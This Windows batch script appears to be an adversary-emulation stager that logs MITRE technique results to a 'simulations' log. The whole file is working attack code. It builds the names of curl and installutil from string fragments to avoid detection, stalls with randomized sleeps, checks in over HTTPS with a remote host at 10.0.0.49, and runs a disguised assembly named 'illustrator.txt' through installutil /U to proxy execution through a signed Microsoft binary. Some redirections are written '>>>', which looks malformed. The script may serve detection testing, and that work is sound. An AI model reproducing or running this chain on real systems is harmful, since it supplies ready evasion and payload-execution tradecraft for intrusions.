@echo off
SETLOCAL EnableDelayedExpansion

REM Random constant names with PHR_ as values
SET yqkrlf=%APPDATA%\7805\48e27a84
SET hxfvj=https://10.0.0.49
SET iwzlh=https://10.0.0.49/stage/2/icon.png?7805-10
SET cpwvbi=ITZEL-S2BO
SET ujolb=10
SET zkpfj=illustrator.txt
SET ltqmhe=7805

REM Setup logging paths
SET tljdf=%APPDATA%\!ujolb!
SET mswzc=%tljdf%\macula-simulations.log
IF NOT EXIST "%tljdf%" MD "%tljdf%" >nul 2>&1

echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Initializing Stage1 DLL execution>>> "!mswzc!" 2>nul

REM Initial delay (30-60s)
SET /A rdel=!RANDOM! %% 31 + 30
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Initial delay start !rdel!s>>> "!mswzc!" 2>nul
timeout /t !rdel! /nobreak >nul
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Initial delay complete>>> "!mswzc!" 2>nul

REM Obfuscated curl command parts
SET mwqsa=c
SET tvpyr=ur
SET gfhbn=l
SET hnyrw=!
SET ghjkl=.exe
SET cuvar1=!mwqsa!!tvpyr!!gfhbn!!hnyrw:~0,-1!!ghjkl!
SET gbvmn=!cuvar1!

REM Obfuscated installutil command parts
SET zxcvb=ins
SET qwert=tall
SET asdfg=util
SET yuiop=.exe
SET inavb=!zxcvb!!qwert!!asdfg!!yuiop!

REM Obfuscated argument parts
SET argb1=/log
SET argb2=file
SET argb3==
SET argb4= /L
SET argb5=ogTo
SET argb6=Consol
SET argb7=e=fal
SET argb8=se
SET argb9= /U

REM Build full commands using variable indirection
SET ref1=gbvmn
SET ref2=inavb
SET ref3=argb1

CALL SET curlexe=%%!ref1!%%
CALL SET instexe=%%!ref2!%%
CALL SET argpart1=%%!ref3!%%

REM Combine argument parts
SET argfull=!argpart1!!argb2!!argb3!!argb4!!argb5!!argb6!!argb7!!argb8!!argb9!

REM Random delay 5-15s
SET /A sdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Pre-heartbeat delay !sdel!s>>> "!mswzc!" 2>nul
ping -n !sdel! 127.0.0.1 >nul

REM Heartbeat check (TTP: T1218 preparation)
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Heartbeat check start>>> "!mswzc!" 2>nul
SET hbres=0
SET hberr=
!curlexe! -k -s -o nul "!iwzlh!"
IF !ERRORLEVEL! EQU 0 (
    SET hbres=1
) ELSE (
    SET hberr=connection_failed
)

REM Format timestamp for TTP logging
FOR /F "tokens=1-3 delims=/- " %%a IN ("!DATE!") DO SET dt=%%c-%%a-%%b
SET tm=!TIME!
SET dt=!dt: =0!
SET tm=!tm:~0,12!
SET fullts=!dt! !tm!

REM Log TTP: Server connection check (implied T1105 for heartbeat)
echo [%fullts%][!cpwvbi!]: !ujolb!-!ltqmhe!-T1105|Ingress Tool Transfer=!hbres!:!hberr!>>> "!mswzc!" 2>&1

IF !hbres! EQU 0 (
    echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Heartbeat failed, exiting>>> "!mswzc!" 2>nul
    EXIT /B 1
)

echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Heartbeat successful>>> "!mswzc!" 2>nul

REM Random delay 5-15s
SET /A sdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Pre-directory change delay !sdel!s>>> "!mswzc!" 2>nul
CHOICE /C Y /N /D Y /T !sdel! >nul

REM Change to output directory
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Changing to directory !yqkrlf!>>> "!mswzc!" 2>nul
CD /D "!yqkrlf!" >nul 2>&1
IF !ERRORLEVEL! NEQ 0 (
    echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Directory change failed>>> "!mswzc!" 2>nul
    SET cres=0
    SET cerr=path_not_found
    GOTO :logexec
)

REM Random delay 10-30s (randomized within range)
SET /A rdelay=!RANDOM! %% 21 + 10
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Random delay !rdelay!s before execution>>> "!mswzc!" 2>nul
timeout /t !rdelay! /nobreak >nul

REM Execute DLL via installutil (T1218)
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Starting DLL execution>>> "!mswzc!" 2>nul
SET cres=0
SET cerr=

REM Get full path to .NET Framework installutil
SET dotnetpath=%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\

REM Obfuscate the path parts
SET winpart=%WINDIR%
SET netpart=\Microsoft.NET\Framework64\v4.0.30319\
SET fullinst=!winpart!!netpart!!instexe!

REM Execute with full path
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Executing: !fullinst! !argfull!"!zkpfj!" >>> "!mswzc!" 2>nul
!fullinst! !argfull!"!zkpfj!"

IF !ERRORLEVEL! EQU 0 (
    SET cres=1
) ELSE (
    SET cerr=assembly_load_failed
)

:logexec
REM Log TTP: T1218 execution
echo [%fullts%][!cpwvbi!]: !ujolb!-!ltqmhe!-T1218|Signed Binary Proxy Execution=!cres!:!cerr!>>> "!mswzc!" 2>&1

IF !cres! EQU 1 (
    echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: DLL execution completed>>> "!mswzc!" 2>nul
) ELSE (
    echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: DLL execution failed: !cerr!>>> "!mswzc!" 2>nul
)

REM Final delay 5-15s
SET /A fdel=!RANDOM! %% 11 + 5
echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Final cleanup delay !fdel!s>>> "!mswzc!" 2>nul
timeout /t !fdel! /nobreak >nul

echo [!DATE! !TIME!][DEBUG][!cpwvbi!]: Stage1 complete>>> "!mswzc!" 2>nul

ENDLOCAL
EXIT /B 0